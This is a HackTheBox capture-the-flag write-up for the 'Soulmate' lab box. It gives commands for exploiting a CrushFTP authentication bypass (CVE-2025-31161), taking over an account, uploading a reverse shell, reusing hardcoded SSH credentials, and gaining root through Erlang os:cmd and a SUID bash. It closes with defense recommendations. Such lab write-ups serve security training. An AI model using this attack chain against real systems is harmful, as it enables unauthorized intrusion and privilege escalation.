# HTB - Soulmate - 10.10.11.86

## Soulmate

> **Platform:** HackTheBox **Difficulty:** Medium **OS:** Linux (Ubuntu) **Key Techniques:** CrushFTP CVE-2025-31161 (Auth Bypass), Reverse Shell via Image Upload, Erlang SSH Credential Discovery, Erlang OTP os:cmd() Root Execution

***

### Box Info

| Property   | Value                              |
| ---------- | ---------------------------------- |
| IP         | `10.10.11.86`                      |
| OS         | Ubuntu (OpenSSH 8.9p1)             |
| Hostname   | `soulmate.htb`                     |
| Difficulty | Medium                             |
| User Flag  | `4f78b5caa6b6d43e9088a13355b7f671` |
| Root Flag  | `af9d8ae4f9328e335ff0b34411afbcb1` |

***

### Attack Chain Overview

```
Nmap → VHost Fuzzing (ftp.soulmate.htb) → CrushFTP CVE-2025-31161 (Auth Bypass) →
Create Admin User → Enumerate Users (ben, jenna, rezk4, crushadmin) →
Change ben's Password → Upload Reverse Shell Image → Shell as www-data →
Erlang SSH Config Found (ben:HouseH0ldings998) → SSH as ben →
Erlang OTP SSH on Port 2222 → os:cmd() as Root → Root Flag
```

***

### Reconnaissance

#### Nmap Scan

**Full TCP port scan with service detection:**

```bash
nmap -p- -A -sCV -PN -vvv 10.10.11.86 -oN nmap.tcp
```

| Port | Service | Details                                            |
| ---- | ------- | -------------------------------------------------- |
| 22   | SSH     | OpenSSH 8.9p1 Ubuntu                               |
| 80   | HTTP    | nginx 1.18.0 — Redirects to `http://soulmate.htb/` |

**Key observations:**

* Only two ports externally accessible
* nginx redirects to `soulmate.htb` — add to `/etc/hosts`
* Minimal attack surface externally, VHost discovery is essential

#### VHost Enumeration

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
  -u http://FUZZ.soulmate.htb/
```

**Result:**

| VHost              | Status | Redirect                   |
| ------------------ | ------ | -------------------------- |
| `ftp.soulmate.htb` | 302    | `/WebInterface/login.html` |

The `ftp` subdomain hosts a **CrushFTP** web interface.

***

### Foothold — CrushFTP CVE-2025-31161 (Authentication Bypass)

#### What is CrushFTP?

CrushFTP is an enterprise file transfer server with a web-based management interface. It supports FTP, SFTP, SCP, HTTP/S, and WebDAV protocols with a built-in web UI for file management and administration.

#### What is CVE-2025-31161?

CVE-2025-31161 (also tracked as CVE-2025-54309) is a critical authentication bypass vulnerability affecting all CrushFTP versions below 10.8.5 and 11.3.4\_23. The vulnerability exploits mishandled AS2 (Applicability Statement 2) header validation in the authentication process. By sending specially crafted requests, an attacker can bypass authentication entirely and create new administrative accounts — gaining full control of the CrushFTP instance without any credentials.

#### Why it works

The AS2 protocol integration in CrushFTP fails to properly validate authentication tokens during certain request types. The exploit sends a crafted request that tricks the server into treating the attacker as an authenticated administrator, then uses that session to create a new user account with full privileges.

#### Exploitation

```bash
python3 cve-2025-31161.py \
  --target_host ftp.soulmate.htb \
  --port 80 \
  --target_user crushadmin \
  --new_user <USERNAME> \
  --password <PASSWORD>
```

| Flag                        | Purpose                               |
| --------------------------- | ------------------------------------- |
| `--target_host`             | CrushFTP hostname                     |
| `--port 80`                 | HTTP port (nginx proxies to CrushFTP) |
| `--target_user crushadmin`  | Existing admin account to impersonate |
| `--new_user` / `--password` | Credentials for the new account       |

**Result:**

```
[+] User created successfully
[+] Exploit Complete you can now login with
   [*] Username: <USERNAME>
   [*] Password: <PASSWORD>
```

#### Enumerating CrushFTP Users

After logging into the CrushFTP web interface with the new account, the following users were discovered:

| Username   | Notes                                             |
| ---------- | ------------------------------------------------- |
| crushadmin | Administrator — web application files stored here |
| ben        | Standard user                                     |
| jenna      | Standard user                                     |
| rezk4      | Standard user                                     |

The `crushadmin` home directory contains the web application files for `soulmate.htb`.

***

### Shell as www-data — Image Upload via Ben's Account

#### Taking Over Ben's Account

With CrushFTP admin access, we can reset ben's password through the CrushFTP user management panel.

#### Uploading a Reverse Shell

After changing ben's password and logging in as ben, we upload a reverse shell disguised as an image file. The web application (hosted from crushadmin's files) processes uploaded images, and the reverse shell payload executes when accessed.

**Step 1: Start a listener:**

```bash
nc -lvnp <PORT>
```

**Step 2:** Upload the reverse shell image through ben's CrushFTP interface into the web application's upload directory.

**Step 3:** Trigger the uploaded file through the web application.

**Result:** Reverse shell as `www-data`.

#### Stabilize the Shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm-256color
export SHELL=bash
```

***

### User Flag — Lateral Movement to Ben via Erlang SSH Config

#### Discovering Erlang SSH Credentials

During enumeration as `www-data`, an Erlang escript file was found that configures a local SSH daemon:

```
/usr/local/lib/erlang_login/start.escript
```

**Critical contents:**

```erlang
ssh:daemon(2222, [
    {ip, {127,0,0,1}},
    {system_dir, "/etc/ssh"},
    {auth_methods, "publickey,password"},
    {user_passwords, [{"ben", "HouseH0ldings998"}]},
    ...
])
```

**What is this?**

This Erlang script starts an SSH daemon on **port 2222** bound to **localhost only** (127.0.0.1) using the Erlang/OTP SSH library. It's configured to accept password authentication with hardcoded credentials for the `ben` user. This is separate from the system's OpenSSH daemon on port 22.

| Finding  | Value                 |
| -------- | --------------------- |
| Username | `ben`                 |
| Password | `HouseH0ldings998`    |
| SSH Port | 2222 (localhost only) |

#### SSH as Ben

```bash
ssh ben@soulmate.htb
# Password: HouseH0ldings998
```

The password also works for the standard SSH on port 22.

```
ben@soulmate:~$ cat user.txt
4f78b5caa6b6d43e9088a13355b7f671
```

***

### Privilege Escalation — Erlang OTP SSH os:cmd()

#### Understanding the Attack Vector

The Erlang SSH daemon on port 2222 runs as **root** (since it was started by a root-owned service). Erlang's SSH implementation provides an interactive Erlang shell by default, which includes the `os:cmd()` function — this function executes operating system commands with the privileges of the Erlang process (root).

#### Why this works

The Erlang/OTP SSH server doesn't drop to a regular Unix shell — it provides an Erlang REPL (Read-Eval-Print Loop). Within this REPL, the `os:cmd("command")` function is a built-in Erlang module that directly calls system commands. Since the Erlang process runs as root, all commands executed through `os:cmd()` also run as root.

#### Step 1: Connect to the Erlang SSH daemon

```bash
ssh -p 2222 ben@127.0.0.1
# Password: HouseH0ldings998
```

This drops into an **Erlang shell** (not bash), indicated by the `1>` prompt.

#### Step 2: Execute commands as root

```erlang
1> os:cmd("whoami").
"root\n"

2> os:cmd("cat /root/root.txt").
"af9d8ae4f9328e335ff0b34411afbcb1\n"
```

For a full root shell:

```erlang
3> os:cmd("chmod +s /bin/bash").
```

Then exit and run:

```bash
bash -p
```

***

### Root Flag

```
af9d8ae4f9328e335ff0b34411afbcb1
```

***

### Credential Summary

| Username            | Password              | Source                               |
| ------------------- | --------------------- | ------------------------------------ |
| CrushFTP (new user) | Attacker-chosen       | CVE-2025-31161 auth bypass           |
| ben (CrushFTP)      | Reset via admin panel | CrushFTP admin access                |
| ben (SSH)           | `HouseH0ldings998`    | Erlang escript hardcoded credentials |

***

### Quick Reference

```bash
# === VHOST ENUMERATION ===
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
  -u http://FUZZ.soulmate.htb/

# === CRUSHFTP AUTH BYPASS ===
python3 cve-2025-31161.py \
  --target_host ftp.soulmate.htb --port 80 \
  --target_user crushadmin --new_user <USER> --password <PASS>

# === REVERSE SHELL (after uploading via CrushFTP) ===
nc -lvnp <PORT>

# === SHELL STABILIZATION ===
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm-256color

# === FIND ERLANG CREDENTIALS ===
find / -name "*.escript" -o -name "*.erl" 2>/dev/null
cat /usr/local/lib/erlang_login/start.escript

# === SSH AS BEN ===
ssh ben@soulmate.htb  # Password: HouseH0ldings998

# === ERLANG ROOT SHELL ===
ssh -p 2222 ben@127.0.0.1  # Password: HouseH0ldings998
# In Erlang shell:
os:cmd("whoami").
os:cmd("cat /root/root.txt").
os:cmd("chmod +s /bin/bash").
# Exit and run: bash -p
```

***

### Troubleshooting

| Issue                                         | Solution                                                                                                                                                                                                                 |
| --------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| VHost fuzzing returns no results              | Ensure `soulmate.htb` is in `/etc/hosts`. Use `-mc 200,301,302,307,401,403,405,500` to catch redirects. Filter by response size if too many false positives                                                              |
| CVE-2025-31161 exploit fails                  | Verify the CrushFTP version is vulnerable (below 10.8.5 or 11.3.4\_23). The `--target_user` must be an existing admin account — try `crushadmin`                                                                         |
| Reverse shell image doesn't execute           | Verify the upload location maps to the web application's document root. The file may need a specific extension (`.php`, `.jsp`) depending on the backend. Check if the web app processes uploads from CrushFTP's storage |
| Can't find Erlang credentials                 | Search for `.escript` and `.erl` files: `find / -name "*.escript" 2>/dev/null`. Also check `/usr/local/lib/` and `/opt/` for Erlang-related directories                                                                  |
| Erlang SSH on port 2222 refuses connection    | It's bound to localhost only (`127.0.0.1`). You must connect from the target itself, not from your attacker machine. Use `ssh -p 2222 ben@127.0.0.1`                                                                     |
| Erlang shell prompt is confusing              | The `1>` prompt is an Erlang REPL, not bash. Commands must use Erlang syntax: `os:cmd("command").` — note the period (`.`) at the end, it's required to execute the expression                                           |
| os:cmd() returns garbled output               | Erlang returns strings as character lists. Use `io:format("~s~n", [os:cmd("command")]).` for cleaner output                                                                                                              |
| Password from escript doesn't work on port 22 | Try the exact password `HouseH0ldings998` (case-sensitive). The escript credentials may only work on the Erlang SSH port (2222), but in this box they also work on standard SSH                                          |

***

### Key Takeaways

**What we learned:**

1. **VHost enumeration reveals hidden services** — The main site on `soulmate.htb` had minimal attack surface, but the `ftp.soulmate.htb` VHost exposed a vulnerable CrushFTP instance
2. **CrushFTP CVE-2025-31161 is a critical auth bypass** — It allows creating new admin accounts without any credentials. File transfer servers are high-value targets in enterprise environments
3. **Admin access to file servers enables creative exploitation** — CrushFTP admin access let us reset ben's password, upload malicious files, and access the web application's document root
4. **Hardcoded credentials in configuration scripts are a common finding** — The Erlang escript contained plaintext SSH credentials (`ben:HouseH0ldings998`). Always search for `.escript`, `.erl`, `.conf`, and similar config files during enumeration
5. **Erlang SSH provides an Erlang shell, not a Unix shell** — This is a powerful but often overlooked privilege escalation vector. If the Erlang process runs as root, `os:cmd()` gives root command execution
6. **Localhost-only services are still exploitable post-shell** — The Erlang SSH daemon was bound to `127.0.0.1:2222`, making it invisible to external scans but fully accessible once you have a shell on the box

**Attack chain summary:**

```
VHost Discovery → CrushFTP Auth Bypass (CVE-2025-31161) → User Takeover →
Reverse Shell (www-data) → Erlang Credentials (ben) → Erlang SSH os:cmd() → Root
```

**Defense recommendations:**

* Patch CrushFTP to version 10.8.5+ or 11.3.4\_23+ immediately to remediate CVE-2025-31161
* Never expose file transfer server management interfaces through public-facing web servers without additional authentication (MFA, IP restrictions)
* Remove hardcoded credentials from Erlang scripts — use environment variables or encrypted configuration files
* If Erlang/OTP SSH is needed, disable the default Erlang shell and restrict to SFTP subsystem only, or run the Erlang process as a non-privileged user
* Audit all localhost-only services — they're still accessible to any attacker with a shell. Apply the same security standards as externally-facing services
* Implement least privilege — the Erlang SSH daemon should not run as root if it only needs to manage file transfers
* Monitor for new account creation on CrushFTP — alert on user management API calls from unexpected sources

***

### Related Topics

* \[\[CrushFTP]]
* \[\[CVE-2025-31161]]
* \[\[VHost Enumeration]]
* \[\[Reverse Shell Upload]]
* \[\[Erlang OTP SSH]]
* \[\[Hardcoded Credentials]]
* \[\[Localhost Service Exploitation]]
* \[\[os:cmd() Privilege Escalation]]

***

### Tags

`#crushftp` `#cve-2025-31161` `#auth-bypass` `#vhost` `#reverse-shell` `#erlang` `#otp-ssh` `#hardcoded-creds` `#localhost-privesc` `#htb-medium` `#linux`
